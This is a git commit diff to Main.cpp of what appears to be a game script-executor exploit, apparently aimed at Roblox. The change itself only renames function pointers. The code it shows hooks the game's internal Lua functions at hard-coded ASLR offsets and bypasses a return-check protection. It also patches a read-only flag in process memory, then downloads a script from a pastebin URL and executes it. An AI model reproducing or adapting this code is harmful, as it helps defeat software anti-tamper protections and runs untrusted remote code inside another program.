7fbc406708d3a8eac05d08333e4f0ae44f9d6e52
Local Communist <32971098+LocalCommunist@users.noreply.github.com>
2018-12-04 07:41:02 -0800

    Update Main.cpp

--- Main.cpp
+++ Main.cpp
@@ -7,22 +7,22 @@
 #include "Retcheck.h"
 
 auto ScriptContextVTable = ASLR(0x13D0758);
-auto lua_getmetatable = (int(__cdecl*)(int, int))Retcheck::unprotect<DWORD>((BYTE*)(ASLR(0x77E2A0)));
-auto lua_pushcclosure = (void(__fastcall*)(int, void*, int))Retcheck::unprotect<DWORD>((BYTE*)(ASLR(0X77ef20)));
-auto lua_setfield = (void(__cdecl*)(int, int, const char*))Retcheck::unprotect<DWORD>((BYTE*)(ASLR(0x77FDF0)));
-auto lua_pushnil = (void(__cdecl*)(int))Retcheck::unprotect<DWORD>((BYTE*)(ASLR(0x77F2B0)));
-auto index2adr = (DWORD*(__cdecl*)(int, signed int))Retcheck::unprotect<DWORD>((BYTE*)ASLR(0x775830));
+auto r_lua_getmetatable = (int(__cdecl*)(int, int))Retcheck::unprotect<DWORD>((BYTE*)(ASLR(0x77E2A0)));
+auto r_lua_pushcclosure = (void(__fastcall*)(int, void*, int))Retcheck::unprotect<DWORD>((BYTE*)(ASLR(0X77ef20)));
+auto r_lua_setfield = (void(__cdecl*)(int, int, const char*))Retcheck::unprotect<DWORD>((BYTE*)(ASLR(0x77FDF0)));
+auto r_lua_pushnil = (void(__cdecl*)(int))Retcheck::unprotect<DWORD>((BYTE*)(ASLR(0x77F2B0)));
+auto r_index2adr = (DWORD*(__cdecl*)(int, signed int))Retcheck::unprotect<DWORD>((BYTE*)ASLR(0x775830));
 
 static int GetRawMetatable_Implementation(unsigned int rL) {
-	if (!lua_getmetatable(rL, -1)) {
-		lua_pushnil(rL);
+	if (!r_lua_getmetatable(rL, -1)) {
+		r_lua_pushnil(rL);
 		return 1;
 	}
 	return 1;
 }
 
 static int SetReadOnly_Implemention(unsigned int rL) {
-	*(BYTE *)(*index2adr(rL, -1) + 8) = 0;
+	*(BYTE *)(*r_index2adr(rL, -1) + 8) = 0;
 	return 1;
 }
 
@@ -37,11 +37,11 @@ int Main(int, char*[]) {
 	auto ScriptContext = Scan(reinterpret_cast<const char*>(&ScriptContextVTable));
 	auto rL = ScriptContext + 0xA4 - *(DWORD *)ScriptContext + 0xA4;
 
-	lua_pushcclosure(rL, GetRawMetatable_Implementation, 0);
-	lua_setfield(rL, -10002, "getrawmetatable");
+	r_lua_pushcclosure(rL, GetRawMetatable_Implementation, 0);
+	r_lua_setfield(rL, -10002, "getrawmetatable");
 
-	lua_pushcclosure(rL, SetReadOnly_Implemention, 0);
-	lua_setfield(rL, -10002, "setreadonly");
+	r_lua_pushcclosure(rL, SetReadOnly_Implemention, 0);
+	r_lua_setfield(rL, -10002, "setreadonly");
 
 	ExecuteScript(rL, DownloadURL("https://pastebin.com/raw/DdEKj90i").c_str());
 
